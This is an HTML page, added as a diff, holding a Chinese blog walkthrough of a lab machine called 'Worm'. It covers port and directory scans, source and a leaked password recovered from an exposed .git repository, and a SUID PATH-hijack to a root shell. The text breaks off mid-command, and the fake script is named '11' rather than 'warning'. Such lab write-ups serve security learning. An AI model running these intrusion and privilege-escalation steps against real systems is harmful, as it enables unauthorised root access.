@@ -1,0 +1,306 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>worm_提权处理 | Rrrr'blog</title><meta name="author" content="Xiaxiaran"><meta name="copyright" content="Xiaxiaran"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="一、信息收集1.首先进行端口扫描123456789101112┌──(kali㉿kali)-[~&#x2F;Desktop]└─$ nmap -p- 192.168.0.112                  Starting Nmap 7.95 ( https:&#x2F;&#x2F;nmap.org ) at 2026-01-23 06:27 ESTNmap scan report for 192.168.0.112 (">
+<meta property="og:type" content="article">
+<meta property="og:title" content="worm_提权处理">
+<meta property="og:url" content="http://example.com/2026/01/24/worm-%E6%8F%90%E6%9D%83%E5%A4%84%E7%90%86/index.html">
+<meta property="og:site_name" content="Rrrr&#39;blog">
+<meta property="og:description" content="一、信息收集1.首先进行端口扫描123456789101112┌──(kali㉿kali)-[~&#x2F;Desktop]└─$ nmap -p- 192.168.0.112                  Starting Nmap 7.95 ( https:&#x2F;&#x2F;nmap.org ) at 2026-01-23 06:27 ESTNmap scan report for 192.168.0.112 (">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/1.jpg">
+<meta property="article:published_time" content="2026-01-24T13:08:40.000Z">
+<meta property="article:modified_time" content="2026-01-23T16:28:05.438Z">
+<meta property="article:author" content="Xiaxiaran">
+<meta property="article:tag" content="SUID提权">
+<meta property="article:tag" content="git泄露">
+<meta property="article:tag" content="提权">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/1.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "worm_提权处理",
+  "url": "http://example.com/2026/01/24/worm-%E6%8F%90%E6%9D%83%E5%A4%84%E7%90%86/",
+  "image": "http://example.com/images/1.jpg",
+  "datePublished": "2026-01-24T13:08:40.000Z",
+  "dateModified": "2026-01-23T16:28:05.438Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Xiaxiaran",
+      "url": "http://example.com"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/images/favicon.png"><link rel="canonical" href="http://example.com/2026/01/24/worm-%E6%8F%90%E6%9D%83%E5%A4%84%E7%90%86/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.3"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'worm_提权处理',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 8.1.1"></head><body><div class="bg-animation" id="web_bg" style="background: [object Object];"></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/images/default_top_img.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Rrrr'blog</span></a><a class="nav-page-title" href="/"><span class="site-name">worm_提权处理</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">worm_提权处理</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2026-01-24T13:08:40.000Z" title="Created 2026-01-24 21:08:40">2026-01-24</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2026-01-23T16:28:05.438Z" title="Updated 2026-01-24 00:28:05">2026-01-24</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BA/">群友靶机</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h3 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h3><h5 id="1-首先进行端口扫描"><a href="#1-首先进行端口扫描" class="headerlink" title="1.首先进行端口扫描"></a>1.首先进行端口扫描</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ nmap -p- 192.168.0.112                  </span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-23 06:27 EST</span><br><span class="line">Nmap scan report for 192.168.0.112 (192.168.0.112)</span><br><span class="line">Host is up (0.00096s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 08:00:27:BD:38:9F (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 10.87 seconds</span><br></pre></td></tr></table></figure>
+
+<p>发现开了两个端口</p>
+<h5 id="2-目录扫描"><a href="#2-目录扫描" class="headerlink" title="2.目录扫描"></a>2.目录扫描</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ sudo dirsearch -u &#x27;http://192.168.0.112&#x27;</span><br><span class="line">[sudo] password for kali: </span><br><span class="line">/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html</span><br><span class="line">  from pkg_resources import DistributionNotFound, VersionConflict</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.3                                             </span><br><span class="line"> (_||| _) (/_(_|| (_| )                                                      </span><br><span class="line">                                                                             </span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25</span><br><span class="line">Wordlist size: 11460</span><br><span class="line"></span><br><span class="line">Output File: /home/kali/Desktop/reports/http_192.168.0.112/_26-01-23_06-28-13.txt</span><br><span class="line"></span><br><span class="line">Target: http://192.168.0.112/</span><br><span class="line"></span><br><span class="line">[06:28:13] Starting:                                                         </span><br><span class="line">[06:28:15] 301 -  313B  - /.git  -&gt;  http://192.168.0.112/.git/             </span><br><span class="line">[06:28:15] 200 -   23B  - /.git/HEAD                                        </span><br><span class="line">[06:28:15] 200 -  606B  - /.git/</span><br><span class="line">[06:28:15] 200 -   92B  - /.git/config</span><br><span class="line">[06:28:15] 200 -    2B  - /.git/COMMIT_EDITMSG                              </span><br><span class="line">[06:28:15] 200 -   73B  - /.git/description</span><br><span class="line">[06:28:15] 200 -  410B  - /.git/branches/</span><br><span class="line">[06:28:15] 200 -  673B  - /.git/hooks/</span><br><span class="line">[06:28:15] 200 -  458B  - /.git/info/                                       </span><br><span class="line">[06:28:15] 200 -  217B  - /.git/index                                       </span><br><span class="line">[06:28:15] 200 -  240B  - /.git/info/exclude</span><br><span class="line">[06:28:15] 200 -  482B  - /.git/logs/                                       </span><br><span class="line">[06:28:15] 200 -  558B  - /.git/logs/HEAD</span><br><span class="line">[06:28:15] 301 -  329B  - /.git/logs/refs/heads  -&gt;  http://192.168.0.112/.git/logs/refs/heads/</span><br><span class="line">[06:28:15] 200 -  558B  - /.git/logs/refs/heads/master</span><br><span class="line">[06:28:15] 301 -  323B  - /.git/logs/refs  -&gt;  http://192.168.0.112/.git/logs/refs/</span><br><span class="line">[06:28:15] 301 -  324B  - /.git/refs/heads  -&gt;  http://192.168.0.112/.git/refs/heads/</span><br><span class="line">[06:28:15] 200 -  462B  - /.git/refs/                                       </span><br><span class="line">[06:28:15] 200 -   41B  - /.git/refs/heads/master                           </span><br><span class="line">[06:28:15] 200 -  532B  - /.git/objects/                                    </span><br><span class="line">[06:28:15] 301 -  323B  - /.git/refs/tags  -&gt;  http://192.168.0.112/.git/refs/tags/</span><br><span class="line">[06:28:15] 403 -  278B  - /.ht_wsr.txt                                      </span><br><span class="line">[06:28:15] 403 -  278B  - /.htaccess.bak1                                   </span><br><span class="line">[06:28:15] 403 -  278B  - /.htaccess.orig                                   </span><br><span class="line">[06:28:15] 403 -  278B  - /.htaccess.sample                                 </span><br><span class="line">[06:28:15] 403 -  278B  - /.htaccess.save</span><br><span class="line">[06:28:16] 403 -  278B  - /.htaccess_extra</span><br><span class="line">[06:28:16] 403 -  278B  - /.htaccess_orig</span><br><span class="line">[06:28:16] 403 -  278B  - /.htaccess_sc                                     </span><br><span class="line">[06:28:16] 403 -  278B  - /.htaccessBAK</span><br><span class="line">[06:28:16] 403 -  278B  - /.htaccessOLD</span><br><span class="line">[06:28:16] 403 -  278B  - /.htaccessOLD2</span><br><span class="line">[06:28:16] 403 -  278B  - /.htm                                             </span><br><span class="line">[06:28:16] 403 -  278B  - /.html</span><br><span class="line">[06:28:16] 403 -  278B  - /.htpasswd_test                                   </span><br><span class="line">[06:28:16] 403 -  278B  - /.htpasswds</span><br><span class="line">[06:28:17] 403 -  278B  - /.php                                             </span><br><span class="line">[06:28:21] 403 -  278B  - /.httr-oauth                                      </span><br><span class="line">[06:29:13] 403 -  278B  - /server-status/                                   </span><br><span class="line">[06:29:14] 403 -  278B  - /server-status</span><br><span class="line"></span><br><span class="line">Task Completed               </span><br></pre></td></tr></table></figure>
+
+<h5 id="3-利用git泄露"><a href="#3-利用git泄露" class="headerlink" title="3.利用git泄露"></a>3.利用git泄露</h5><p>发现git泄露 用git-dumper下载下来</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source venv/bin/activate</span><br></pre></td></tr></table></figure>
+
+<p>先激活python虚拟环境</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 git_dumper.py http://192.168.0.112/ ./source_code</span><br></pre></td></tr></table></figure>
+
+<p>再用 git-dumper 还原目标网站的 Git 泄露源码</p>
+<p>接着进入这个目录 并查看这个目录下的文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd source_code</span><br><span class="line">ls -al</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://xiaxianiu.oss-cn-beijing.aliyuncs.com/image-20260123234036485.png" alt="image-20260123234036485"></p>
+<p>可以发现有一个creds.txt文件</p>
+<p>查看文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cat creds.txt                       </span><br><span class="line">june:showmeyourpassword</span><br></pre></td></tr></table></figure>
+
+<p>发现密码不对</p>
+<p>接下来 查看git的历史提交</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">┌──(venv)─(kali㉿kali)-[~/Desktop/git-dumper/source_code]</span><br><span class="line">└─$ git log -p                                         </span><br><span class="line">commit b20ebc0e54047f39e739f50e21837b154cd4c6b9 (HEAD -&gt; master)</span><br><span class="line">Author: Your Name &lt;you@example.com&gt;</span><br><span class="line">Date:   Tue Jan 20 09:07:31 2026 -0500</span><br><span class="line"></span><br><span class="line">    4</span><br><span class="line"></span><br><span class="line">diff --git a/creds.txt b/creds.txt</span><br><span class="line">new file mode 100644</span><br><span class="line">index 0000000..8b25a83</span><br><span class="line">--- /dev/null</span><br><span class="line">+++ b/creds.txt</span><br><span class="line">@@ -0,0 +1 @@</span><br><span class="line">+june:showmeyourpassword</span><br><span class="line"></span><br><span class="line">commit 1e0f35c5f74fa99bfff05187488e76bc6c072db6</span><br><span class="line">Author: Your Name &lt;you@example.com&gt;</span><br><span class="line">Date:   Tue Jan 20 09:07:02 2026 -0500</span><br><span class="line"></span><br><span class="line">    3</span><br><span class="line"></span><br><span class="line">diff --git a/creds.txt b/creds.txt</span><br><span class="line">deleted file mode 100644</span><br><span class="line">index e9a18ec..0000000</span><br><span class="line">:</span><br></pre></td></tr></table></figure>
+
+<p>用hash查看密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">┌──(venv)─(kali㉿kali)-[~/Desktop/git-dumper/source_code]</span><br><span class="line">└─$ git show 1e0f35c5f74fa99bfff05187488e76bc6c072db6          </span><br><span class="line">commit 1e0f35c5f74fa99bfff05187488e76bc6c072db6</span><br><span class="line">Author: Your Name &lt;you@example.com&gt;</span><br><span class="line">Date:   Tue Jan 20 09:07:02 2026 -0500</span><br><span class="line"></span><br><span class="line">    3</span><br><span class="line"></span><br><span class="line">diff --git a/creds.txt b/creds.txt</span><br><span class="line">deleted file mode 100644</span><br><span class="line">index e9a18ec..0000000</span><br><span class="line">--- a/creds.txt</span><br><span class="line">+++ /dev/null</span><br><span class="line">@@ -1,3 +0,0 @@</span><br><span class="line">-june</span><br><span class="line">-mTdwC2mn94UlBr31y56t</span><br><span class="line">-</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>得知账号：june 密码：mTdwC2mn94UlBr31y56t</p>
+<h3 id="二、提权处理"><a href="#二、提权处理" class="headerlink" title="二、提权处理"></a>二、提权处理</h3><h5 id="1-SUID提权处理"><a href="#1-SUID提权处理" class="headerlink" title="1.SUID提权处理"></a>1.SUID提权处理</h5><p>可以用SUID（<strong>让程序在执行时，临时拥有文件所有者的权限，而不是当前用户的权限</strong>。）来进行提权处理</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">june@Worm:~$ find / -perm -4000 -type f 2&gt;/dev/null</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/pkexec</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/libexec/polkit-agent-helper-1</span><br><span class="line">/opt/write</span><br></pre></td></tr></table></figure>
+
+<p>补:</p>
+<p>-perm -4000核心条件：匹配权限</p>
+<p>4000 是 SUID 权限的八进制值</p>
+<p>-4000 表示至少拥有 SUID 权限（权限位中包含 s）。例如：-rwsr-xr-x（4755）、-rwsr-sr-x（6755）都会被匹配。 </p>
+<p>2000 → SGID 权限 1000 → Sticky 位</p>
+<p>接下来进入&#x2F;opt&#x2F;write</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">june@Worm:~$ file /opt/write</span><br><span class="line">/opt/write: setuid, setgid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=27651f89f30d7776451a03c126098145710ad948, for GNU/Linux 3.2.0, not stripped</span><br></pre></td></tr></table></figure>
+
+<p>因为它是 <strong><code>not stripped</code></strong>，用 IDA 打开时，能直接看到 <code>main</code> 函数和 <code>system</code>、<code>write</code> 等调用，<strong>快速定位漏洞</strong>。</p>
+<p>结合它的 <strong>文件写入功能</strong>，直接写入 <code>bash -p</code> 提权</p>
+<h5 id="2-文件下载"><a href="#2-文件下载" class="headerlink" title="2.文件下载"></a>2.文件下载</h5><p>再打开一个终端进行下载</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# scp june@192.168.0.112:/opt/write .</span><br><span class="line">The authenticity of host &#x27;192.168.0.112 (192.168.0.112)&#x27; can&#x27;t be established.</span><br><span class="line">ED25519 key fingerprint is SHA256:O2iH79i8PgOwV/Kp8ekTYyGMG8iHT+YlWuYC85SbWSQ.</span><br><span class="line">This key is not known by any other names.</span><br><span class="line">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="line">Warning: Permanently added &#x27;192.168.0.112&#x27; (ED25519) to the list of known hosts.</span><br><span class="line">june@192.168.0.112&#x27;s password: </span><br><span class="line">write                                      100%   17KB   1.8MB/s   00:00 </span><br></pre></td></tr></table></figure>
+
+<p>将下载后的write文件放ida进行分析</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  size_t v3; // rax</span><br><span class="line">  int fd; // [rsp+24h] [rbp-Ch]</span><br><span class="line">  char *s; // [rsp+28h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  if ( argc != 2 )</span><br><span class="line">  &#123;</span><br><span class="line">    fprintf(stderr, &quot;Usage: %s \&quot;message to write\&quot;\n&quot;, *argv);</span><br><span class="line">    exit(1);</span><br><span class="line">  &#125;</span><br><span class="line">  s = (char *)argv[1];</span><br><span class="line">  if ( setuid(0) &lt; 0 )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(&quot;setuid(0) failed&quot;);</span><br><span class="line">    exit(1);</span><br><span class="line">  &#125;</span><br><span class="line">  fd = open(&quot;/opt/welcome.txt&quot;, 577, 420LL);</span><br><span class="line">  if ( fd &lt; 0 )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(&quot;Failed to open /opt/welcome.txt&quot;);</span><br><span class="line">    if ( setuid(0) &lt; 0 )</span><br><span class="line">    &#123;</span><br><span class="line">      perror(&quot;setuid(0) failed before calling warning&quot;);    //漏洞点1</span><br><span class="line">      exit(1);</span><br><span class="line">    &#125;</span><br><span class="line">    system(&quot;warning&quot;);</span><br><span class="line">    exit(1);</span><br><span class="line">  &#125;</span><br><span class="line">  v3 = strlen(s);</span><br><span class="line">  if ( write(fd, s, v3) &lt; 0 )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(&quot;Failed to write to file&quot;);</span><br><span class="line">    close(fd);</span><br><span class="line">    if ( setuid(0) &lt; 0 )</span><br><span class="line">    &#123;</span><br><span class="line">      perror(&quot;setuid(0) failed before calling warning&quot;);    //漏洞点2</span><br><span class="line">      exit(1);</span><br><span class="line">    &#125;</span><br><span class="line">    system(&quot;warning&quot;);</span><br><span class="line">    exit(1);</span><br><span class="line">  &#125;</span><br><span class="line">  close(fd);</span><br><span class="line">  puts(&quot;Message successfully written to /opt/welcome.txt&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这是一个<strong>SUID 权限特征</strong> 的 C 程序</p>
+<p><strong>相对路径</strong>：<code>system()</code> 函数会调用 <code>/bin/sh -c</code> 来执行命令。由于程序没有指定 <code>warning</code> 的绝对路径（如 <code>/usr/bin/warning</code>），系统会根据当前用户的 <strong><code>$PATH</code> 环境变量</strong> 去寻找这个可执行文件。</p>
+<p><strong>特权执行</strong>：在调用 <code>system</code> 之前，程序执行了 <code>setuid(0)</code>。这意味着 <code>warning</code> 命令将以 <strong>root 身份</strong> 运行。</p>
+<p><strong>劫持过程</strong>：</p>
+<ul>
+<li>攻击者可以创建一个名为 <code>warning</code> 的恶意脚本（例如：<code>#!/bin/sh\n/bin/sh</code>）。</li>
+<li>将该脚本所在的目录添加到自己的 <code>$PATH</code> 最前面。</li>
+<li>故意触发程序的错误（例如，通过某种方式让 <code>/opt/welcome.txt</code> 无法打开，或者干脆填满磁盘空间导致写入失败）。</li>
+<li>程序执行 <code>system(&quot;warning&quot;)</code> 时，实际上运行了攻击者的脚本，从而获得一个 <strong>root shell</strong>。</li>
+</ul>
+<h5 id="3-触发程序拿到权限"><a href="#3-触发程序拿到权限" class="headerlink" title="3.触发程序拿到权限"></a>3.触发程序拿到权限</h5><p>现在就是要写一个脚本来触发程序执行warning拿到root权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">june@Worm:~$ cd /tmp          # 步骤1：进入可写目录</span><br><span class="line">june@Worm:/tmp$ echo &#x27;#!/bin/bash&#x27; &gt;11  # 步骤2：创建伪造脚本</span><br><span class="line">june@Worm:/tmp$ echo &#x27;/bin/bash -p&#x27; &gt;&gt;11 # 步骤3：写入提权payload</span><br><span class="line">june@Worm:/tmp$ chmod +x 11   # 步骤4：给脚本执行权限</span><br><span class="line">june@Worm:/tmp$ export PATH=/tmp:$PATH  # 步骤5：劫持PATH</span><br><span class="line">june@Worm:/tmp$ trap &#x27;&#x27; SIGXFSZ  # 步骤6：屏蔽文件大小超限信号</span><br><span class="line">june@Worm:/tmp$ ulimit -f 0   # 步骤7：设置文件大小限制为0</span><br><span class="line">june@Worm:/tmp$ /opt/write &#x27;test&#x27;  # 